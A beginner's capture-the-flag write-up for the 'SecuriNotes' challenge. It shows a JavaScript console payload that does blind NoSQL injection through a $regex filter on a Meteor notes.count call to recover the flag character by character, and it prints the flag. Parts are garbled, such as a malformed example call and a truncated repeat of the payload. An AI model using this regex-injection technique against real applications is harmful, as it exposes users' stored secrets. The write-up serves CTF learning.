# Securinotes

Challenge's desecription: You have access to the SecuriNotes application. You overheard your coworker Terry talking about how he uses it as a password manager. What could possibly go wrong...

# Vulnerability
This challenge's Vulnerability is Blind Nosqli.

# Truth
Honestly, i didn't really know what type Vulnerability is happening in the website. But my good friend told me it was nosqli. So i am finding about it and i found
one Blog post. (https://www.netsparker.com/blog/web-security/what-is-nosql-injection/)

# Payload
So I create the payload. Actually it took me 5 or 6 hour to create it. because i am noob at javascript.

My payload: const fuzz = (known,letter) => {
  Meteor.call("notes.count", {
    "body": {"$regex":`flag{${known}${letter}`}
  }, console.log);
}

I add regex that given in websokcet. and Our flag format is flag{}. So i add flag{.

I am noob at java. And i found this payload in one blog post. And i just edit in some places to work in this challenge. So i can't explain step by step. 

# Solution
So I paste the payload in browser's console. and it was undefined. But we didn't get flag directly because we need to fuzz. So tried all the words and letter.(a,b,c,1,2,3)

Example: fuzz{flag{','4'). 

If our input's letter is in flag, it will response undefined 0. So i fuzzed with all. And get flag. Really hard challenge.

# Payloads
onst fuzz = (known,letter) => {
  Meteor.call("notes.count", {
    "body": {"$regex":`flag{${known}${letter}`}
  }, console.log);
}

# Flag
flag{4lly0Urb4s3}

# Sorry
I can't upload or put image because of my laptop error. Sorry
